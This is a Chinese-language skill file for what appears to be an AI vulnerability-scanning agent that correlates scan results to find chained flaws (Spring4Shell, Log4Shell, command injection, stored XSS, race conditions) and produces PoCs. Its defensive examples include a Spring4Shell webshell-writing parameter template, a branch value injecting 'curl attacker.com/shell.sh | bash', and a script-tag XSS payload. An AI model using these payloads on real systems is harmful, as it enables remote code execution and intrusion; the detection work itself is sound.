---
name: combo-pattern-analyzer
description: 组合漏洞检测引擎：关联多个维度的扫描结果，检测需要多个切面组合才能触发的复杂漏洞模式（如Spring4Shell、Log4Shell、n8n RCE等）。
---

# 概述与边界

## 核心职责

- **聚焦**：检测多维度组合才能成立的漏洞（串行攻击链、并行条件叠加、时序竞态组合）
- **输入**：所有维度analyzer的扫描结果
- **输出**：组合漏洞清单 + 攻击路径图 + PoC生成
- **价值**：发现单一维度无法检测的复杂漏洞（如Spring4Shell、Log4Shell）

## 为什么需要组合检测？

### 经典案例

```
Spring4Shell:
  Mass Assignment → Reflection Chain → File Write → RCE
  (需要3个切面组合)

Log4Shell:
  Logging User Input → JNDI Expression → Remote Class Load → RCE
  (需要3个切面组合)

n8n Git Node RCE:
  Config Parameter → Dataflow → Command Execution → RCE
  (需要2个切面组合)
```

---

## 组合模式分类

### 类型1: 串行组合（攻击链）

```yaml
pattern: A → B → C → Vulnerability

description: 每一步都是"合法功能"，组合在一起形成攻击链

examples:
  spring4shell:
    chain:
      - mass_assignment: "参数绑定允许访问class属性"
      - reflection_chain: "通过反射链访问classLoader"
      - file_write: "修改Tomcat日志配置写入webshell"
    severity: CRITICAL

  log4shell:
    chain:
      - user_input_logged: "用户输入记录到日志"
      - jndi_expression: "Log4j解析${jndi:...}表达式"
      - remote_load: "JNDI查找加载远程类"
    severity: CRITICAL

detection_strategy: |
  1. 加载攻击链模板
  2. 匹配每个环节的特征
  3. 验证环节之间的连接性
  4. 确认完整攻击链可达
```

### 类型2: 并行组合（条件叠加）

```yaml
pattern: Condition_A ∧ Condition_B ∧ Condition_C → Vulnerability

description: 需要多个条件同时满足

examples:
  grafana_path_traversal:
    conditions:
      - plugin_loadable: "插件系统允许加载"
      - path_not_normalized: "path.join未规范化路径"
      - file_directly_read: "文件直接读取无验证"
    severity: HIGH

  oauth_ssrf:
    conditions:
      - oauth_flow_exists: "存在OAuth认证流程"
      - redirect_uri_controllable: "redirect_uri参数可控"
      - ssrf_exists: "服务端会请求redirect_uri"
    severity: HIGH

detection_strategy: |
  1. 提取所有条件
  2. 检查每个条件是否满足
  3. 所有条件同时满足时报告
```

### 类型3: 时序组合（竞态条件）

```yaml
pattern: |
  T1: Check
  T2: Race Window (并发修改状态)
  T3: Execute

description: 利用检查和执行之间的时间窗口

examples:
  idor_toctou:
    sequence:
      - T1_check: "检查资源所有权 (owner_id = current_user)"
      - T2_race: "并发修改owner_id为攻击者ID"
      - T3_execute: "执行操作 (已通过检查)"
    severity: HIGH

  payment_race:
    sequence:
      - T1_check: "检查余额"
      - T2_race: "并发重复扣款"
      - T3_execute: "扣款操作"
    severity: CRITICAL

detection_strategy: |
  1. 识别TOCTOU模式 (Check → Use)
  2. 分析检查和使用之间的时间窗口
  3. 检查是否有锁/事务保护
  4. 评估竞态窗口大小
```

### 类型4: 跨边界组合（信任传递）

```yaml
pattern: |
  Untrusted_Input → Trusted_Storage → Dangerous_Operation

description: 数据跨越信任边界时缺少验证

examples:
  second_order_sql:
    path:
      - write_phase: "SQL注入写入数据库 (未净化)"
      - storage: "数据库存储 (被视为可信)"
      - read_phase: "读取数据库 (视为可信)"
      - output_phase: "拼接到SQL查询 (未净化)"
    severity: HIGH

  config_driven_rce:
    path:
      - user_config: "用户配置参数"
      - storage: "保存到数据库 (视为可信)"
      - workflow_exec: "工作流执行时读取"
      - command_exec: "配置参数→exec() (未验证)"
    severity: CRITICAL

detection_strategy: |
  1. 识别信任边界穿越点
  2. 追踪数据跨边界传播
  3. 检查每个边界的验证
  4. 标注缺少验证的边界
```

---

## 攻击链模板库

### 模板定义格式

```yaml
# .claude/skills/combo-pattern-analyzer/attack-chains/spring4shell.yaml

name: Spring4Shell
cve: CVE-2022-22965
severity: CRITICAL
pattern_type: 串行组合

chain:
  - step: 1
    dimension: config-env-analyzer
    finding_type: mass_assignment_enabled
    indicators:
      - "@ModelAttribute without binding restrictions"
      - "Spring MVC parameter binding"
    code_pattern: |
      @PostMapping("/user")
      public String updateUser(@ModelAttribute User user) { ... }

  - step: 2
    dimension: dataflow-analyzer
    finding_type: reflection_chain_to_classloader
    indicators:
      - "access to class.module.classLoader"
      - "getClass().getModule().getClassLoader()"
    path_pattern: |
      user.getClass() → getModule() → getClassLoader()

  - step: 3
    dimension: trust-boundary-analyzer
    finding_type: classloader_to_file_write
    indicators:
      - "Tomcat AccessLogValve configuration"
      - "pipeline.first.pattern writable"
    dangerous_operation: "file_write_via_logging"

verdict:
  if: all_steps_matched
  output:
    title: "Spring4Shell RCE (CVE-2022-22965)"
    description: "通过参数绑定→反射链→日志配置修改实现RCE"
    poc_template: |
      class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
      class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
      class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
      class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
```

### 内置攻击链模板

```yaml
builtin_templates:
  - spring4shell.yaml
  - log4shell.yaml
  - n8n_git_rce.yaml
  - grafana_path_traversal.yaml
  - oauth_ssrf.yaml
  - second_order_sqli.yaml
  - fastjson_rce.yaml
  - idor_toctou.yaml
```

---

## 输入格式

### 必需输入

所有维度analyzer的扫描结果：

```json
{
  "dimension_results": {
    "dataflow": ".workspace/tasks/orch-002/dataflow-analysis.json",
    "config-env": ".workspace/tasks/orch-003/config-env-analysis.json",
    "trust-boundary": ".workspace/tasks/orch-004/trust-boundary-analysis.json",
    "state-machine": ".workspace/tasks/orch-005/state-machine-analysis.json",
    // ... 其他维度
  },
  "project_root": "/path/to/project"
}
```

---

## 检测流程

### Step 1: 加载所有维度结果

```python
def load_dimension_results(task_dir):
    """加载所有维度的扫描结果"""

    results = {}

    dimension_files = {
        "dataflow": "dataflow-analysis.json",
        "config-env": "config-env-analysis.json",
        "trust-boundary": "trust-boundary-analysis.json",
        // ...
    }

    for dimension, filename in dimension_files.items():
        path = os.path.join(task_dir, filename)
        if os.path.exists(path):
            results[dimension] = json.load(open(path))

    return results
```

### Step 2: 匹配攻击链模板

```python
def match_attack_chains(dimension_results, templates):
    """匹配攻击链模板"""

    matches = []

    for template in templates:
        chain_matched = True
        matched_findings = []

        # 检查每个环节是否匹配
        for step in template.chain:
            dimension = step.dimension
            finding_type = step.finding_type

            # 在对应维度的结果中查找匹配
            findings = dimension_results.get(dimension, {}).get("findings", [])

            matched = find_matching_finding(findings, finding_type, step.indicators)

            if matched:
                matched_findings.append({
                    "step": step.step,
                    "finding": matched
                })
            else:
                chain_matched = False
                break

        if chain_matched:
            matches.append({
                "template": template.name,
                "severity": template.severity,
                "matched_chain": matched_findings
            })

    return matches
```

### Step 3: 验证攻击链可达性

```python
def verify_chain_reachability(matched_chain):
    """验证攻击链的环节之间是否连通"""

    for i in range(len(matched_chain) - 1):
        current_step = matched_chain[i]
        next_step = matched_chain[i + 1]

        # 检查当前环节的输出是否能到达下一环节的输入
        if not is_reachable(current_step.output, next_step.input):
            return False, f"Step {i} → Step {i+1} 不连通"

    return True, "所有环节连通"
```

### Step 4: 生成PoC

```python
def generate_poc(template, matched_chain):
    """根据匹配的攻击链生成PoC"""

    poc = template.poc_template

    # 替换模板中的占位符
    for step in matched_chain:
        poc = poc.replace(f"{{step_{step.step}}}", step.finding.value)

    return poc
```

---

## 输出格式

**输出路径**：`.workspace/tasks/{TASK_ID}/combo-vulnerabilities.json`

```json
{
  "dimension": "combo-pattern",
  "scan_time": "2025-12-16T12:00:00Z",
  "templates_loaded": 8,
  "matches_found": 3,

  "combo_vulnerabilities": [
    {
      "id": "combo-001",
      "pattern": "n8n Git Node RCE",
      "pattern_type": "串行组合",
      "severity": "CRITICAL",
      "confidence": "HIGH",

      "chain": [
        {
          "step": 1,
          "dimension": "config-env-analyzer",
          "finding_id": "ce-001",
          "description": "工作流配置参数 git_branch 可控",
          "location": "workflow.json:34",
          "evidence": "config.git_branch 来自用户输入"
        },
        {
          "step": 2,
          "dimension": "dataflow-analyzer",
          "finding_id": "df-045",
          "description": "config.branch → executeGitCommand()",
          "location": "src/nodes/git.js:67-78",
          "evidence": "数据流路径：config.branch → exec(`git clone -b ${branch}`)"
        },
        {
          "step": 3,
          "dimension": "trust-boundary-analyzer",
          "finding_id": "bc-012",
          "description": "配置→命令执行边界缺少转义",
          "location": "src/nodes/git.js:78",
          "evidence": "exec()使用字符串拼接，未使用execFile参数化"
        }
      ],

      "attack_path": "workflow.json:git_branch → config.branch → exec() → RCE",

      "poc": {
        "config": {
          "git_branch": "main; curl attacker.com/shell.sh | bash;"
        },
        "trigger": "执行工作流",
        "expected_result": "远程下载并执行恶意脚本"
      },

      "impact": "普通用户可通过工作流配置执行任意系统命令",

      "cve_reference": "类似 n8n CVE-2023-XXXX",

      "fix_recommendation": "使用execFile参数化执行，或对git_branch进行严格白名单验证"
    },
    {
      "id": "combo-002",
      "pattern": "Second Order SQL Injection + XSS",
      "pattern_type": "跨边界组合",
      "severity": "HIGH",
      "confidence": "MEDIUM",

      "chain": [
        {
          "step": 1,
          "dimension": "dataflow-analyzer",
          "finding_id": "df-012",
          "description": "用户输入bio写入数据库未净化",
          "location": "src/api/profile.js:34",
          "evidence": "req.body.bio → db.update({bio: bio})"
        },
        {
          "step": 2,
          "dimension": "trust-boundary-analyzer",
          "finding_id": "bc-008",
          "description": "数据库→业务逻辑边界缺少验证",
          "location": "src/views/profile.js:23",
          "evidence": "db.findById()返回的数据被视为可信"
        },
        {
          "step": 3,
          "dimension": "dataflow-analyzer",
          "finding_id": "df-023",
          "description": "数据库数据未转义直接输出HTML",
          "location": "src/views/profile.js:45",
          "evidence": "res.send(`<div>${user.bio}</div>`)"
        }
      ],

      "attack_path": "req.body.bio → DB → res.send() → Stored XSS",

      "poc": {
        "step1": "POST /api/profile {bio: '<script>alert(1)</script>'}",
        "step2": "GET /profile/123",
        "expected_result": "XSS触发"
      },

      "attack_type": "second_order",
      "impact": "存储型XSS，影响所有访问该用户资料的用户"
    },
    {
      "id": "combo-003",
      "pattern": "IDOR + TOCTOU Race Condition",
      "pattern_type": "时序组合",
      "severity": "HIGH",
      "confidence": "MEDIUM",

      "chain": [
        {
          "step": 1,
          "dimension": "dataflow-analyzer",
          "finding_id": "df-067",
          "description": "资源ID可枚举",
          "location": "src/api/resource.js:56"
        },
        {
          "step": 2,
          "dimension": "temporal-analyzer",
          "finding_id": "temp-003",
          "description": "权限检查和操作执行之间存在竞态窗口",
          "location": "src/api/resource.js:89-102",
          "time_window": "13 lines / ~50ms"
        }
      ],

      "attack_scenario": "线程1检查权限 → 线程2并发修改owner_id → 线程1执行删除",

      "impact": "可删除其他用户的资源"
    }
  ],

  "statistics": {
    "total_patterns_checked": 8,
    "patterns_matched": 3,
    "critical": 1,
    "high": 2,
    "medium": 0
  }
}
```

---

## 下游任务

```json
{
  "tasks": [],
  "reason": "combo-pattern-analyzer是分析终点，不生成下游任务"
}
```

---

## 与其他维度的协作

### 前置依赖（必需）

- **dataflow-analyzer**: 提供数据流图
- **config-env-analyzer**: 提供配置攻击面
- **trust-boundary-analyzer**: 提供边界穿越信息

### 可选依赖

- **state-machine-analyzer**: 状态机漏洞
- **temporal-analyzer**: 时序漏洞
- **dependency-analyzer**: 组件漏洞

---

## 重要约束

1. ✅ **必须等待所有维度完成**：combo-pattern-analyzer必须在所有其他analyzer之后执行
2. ⚠️ **模板扩展性**：支持用户自定义攻击链模板
3. ⚠️ **误报控制**：标注confidence（HIGH/MEDIUM/LOW）
4. ⚠️ **性能考虑**：大型项目可能有大量findings，需要优化匹配算法

---

## 参考资料

- [Spring4Shell Analysis](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Log4Shell Technical Details](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [MITRE ATT&CK - Attack Patterns](https://attack.mitre.org/)
